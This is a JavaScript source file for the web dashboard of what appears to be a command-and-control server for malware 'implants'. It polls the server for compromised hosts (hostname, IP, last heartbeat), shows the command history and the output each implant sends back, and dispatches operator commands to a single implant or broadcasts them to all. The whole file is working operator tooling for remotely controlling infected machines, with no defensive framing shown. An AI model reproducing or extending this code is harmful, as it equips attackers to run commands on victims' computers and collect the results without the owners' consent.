let implantCount = document.getElementById("implant-count");
let implantTable = document.getElementById("implant-table");

let commandBox = document.getElementById("command-box");
let sendCommandBtn = document.getElementById("send-command");

let cmdCount = document.getElementById("cmd-count");
let cmdTable = document.getElementById("cmd-history-table");


const updateImplants = async() => {
    const res = await fetch("/admin/online-implants");
    const json = await res.json();
    
    implantCount.innerHTML = `${json.implants.length} Implants <span style="color: green;">online</span> right now`;
    implantTable.innerHTML = `
    <table style="border: 1px solid black;">
    <thead>
            <tr>
                <th>ID</th>
                <th>Hostname</th>
                <th>Ip</th>
                <th>Port</th>
                <th>Last Heartbeat</th>
                <th>Registered at</th>
            </tr>
        </thead>
        
        <tbody>
        ${json.implants.map(imp => `
            <tr>
            <td>${imp.id}</td>
            <td>${imp.hostname}</td>
            <td>${imp.ip}</td>
            <td>${imp.port}</td>
            <td>${imp.last_heartbeat} sec ago</td>
            <td>${imp.registered_at}</td>
            </tr>
            `
        ).join("")}
        </tbody>
        </table>
        `
}
    
const updateCmdHistory = async() => {
    const res = await fetch("/admin/commands");
    const json = await res.json();

    cmdCount.innerHTML = `${json.cmds.length} Commands in found history`;
    cmdTable.innerHTML = `
    <table style="border: 1px solid black;">
    <thead>
            <tr>
                <th>ID</th>
                <th>Command</th>
                <th>Target</th>
                <th>Status</th>
                <th>Sent at</th>
                <th>Results</th>
            </tr>
        </thead>

        <tbody>
            ${json.cmds.map(cmd => `
            <tr>
                <td>${cmd.id}</td>
                <td>${cmd.command_text}</td>
                <td>${cmd.target}</td>
                <td>${cmd.status}</td>
                <td>${cmd.sent_at}</td>
                ${cmd.status === "pending" ? "<td><p>N/A</p></td>" : `<td><button class="btn" data-cmd="${cmd.id}">Show result</button></td>`}
            </tr>
            `
        ).join("")}
        </tbody>
        </table>
    `
}




const openResultModal = (cmdID, results) => {
    // console.log(results)
    document.getElementById("modal-cmd-id").innerText = cmdID

    const resultContainer = document.getElementById("result")
    resultContainer.innerHTML = `
    ${results.map(r => `
        <h3>Result from implant #${r.implant_id} (${r.implant_ip})</h3>
        <p>Received at: ${r.received_at}</p>
        <div class="output-box">
            <p>${r.output.replaceAll("\n", "<br>")}</p>
        </div>
    `).join("")}
    `

    document.getElementById("modal").classList.add("modal-show")
}

document.getElementById("close-modal").onclick = () => document.getElementById("modal").classList.remove("modal-show")

cmdTable.addEventListener("click", async(e) => {
    const btn = e.target.closest("button[data-cmd]");
    if(!btn) return;

    const cmdId = btn.dataset.cmd;

    const res = await fetch(`/admin/get-result?id=${cmdId}`);
    const json = await res.json();
    // console.log(json)

    openResultModal(cmdId, json.results)
})


const UPDATE_INTERVAL = 10000;

updateImplants();
updateCmdHistory();

setInterval(async() => {
    await updateImplants();
    await updateCmdHistory();
}, UPDATE_INTERVAL)



document.addEventListener("DOMContentLoaded", () => {
  const payloadTarget = document.getElementById("payload-target");
  const implantSelectContainer = document.getElementById("implant-select");
  const payloadModeTitle = document.getElementById("payload-mode-title");
  const commandBox = document.getElementById("command-box");
  const sendCommandBtn = document.getElementById("send-command");


  const renderBroadcastMode = () => {
    payloadModeTitle.innerHTML = `
      <h2>Broadcast command</h2>
      <p><b>All implants</b> will get it, even those who join late</p>
    `;
    
    implantSelectContainer.innerHTML = "";
  };

  const renderSingularMode = async () => {
    payloadModeTitle.innerHTML = `
      <h2>Send command</h2>
      <p><b>Only the selected implant</b> will get it</p>
    `;

    implantSelectContainer.innerHTML = `<p>Loading implants…</p>`;

    try {
      const res = await fetch("/admin/online-implants");
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const json = await res.json();

      if (!json.implants || json.implants.length === 0) {
        implantSelectContainer.innerHTML = `<div style="color: #c00">No implants online</div>`;
        return;
      }

      implantSelectContainer.innerHTML = `
        <select id="implant-select-input" required>
          ${json.implants.map(imp => `
            <option value="${imp.id}">Implant #${imp.id} (${imp.ip})</option>
          `).join("")}
        </select>
      `;
    } catch (err) {
      implantSelectContainer.innerHTML = `<div style="color:#c00">Failed to load implants</div>`;
      console.error("Failed fetching implants:", err);
    }
  };

  
  payloadTarget.addEventListener("change", async (e) => {
    if (e.target.value === "singular") {
      await renderSingularMode();
    } else {
      renderBroadcastMode();
    }
  });

  
  if (payloadTarget.value === "singular") {
    renderSingularMode();
  } else {
    renderBroadcastMode();
  }

  
  sendCommandBtn.addEventListener("click", async () => {
    const cmd = commandBox.value.trim();
    if (!cmd) return alert("Enter a command");

    const mode = payloadTarget.value || "all";

    if (mode === "all") {
      const res = await fetch("/admin/broadcast-command", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ cmd })
      });
      const j = await res.json();
      if (res.ok) alert(`Dispatched: cmd id #${j.cmd_id}`);
      else alert(`Error: ${j.error || JSON.stringify(j)}`);
      return;
    }

    
    const selectEl = document.getElementById("implant-select-input");
    if (!selectEl || !selectEl.value) {
      return alert("No implant selected");
    }
    const implantId = selectEl.value;

    
    const res = await fetch("/admin/send-command", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ cmd, target: "singular", target_id: Number(implantId) })
    });
    const j = await res.json();
    if (res.ok) {
      alert(`Dispatched to implant #${implantId}, command id #${j.cmd_id}`);
    } else {
      alert(`Error: ${j.error || JSON.stringify(j)}`);
    }
  });
});
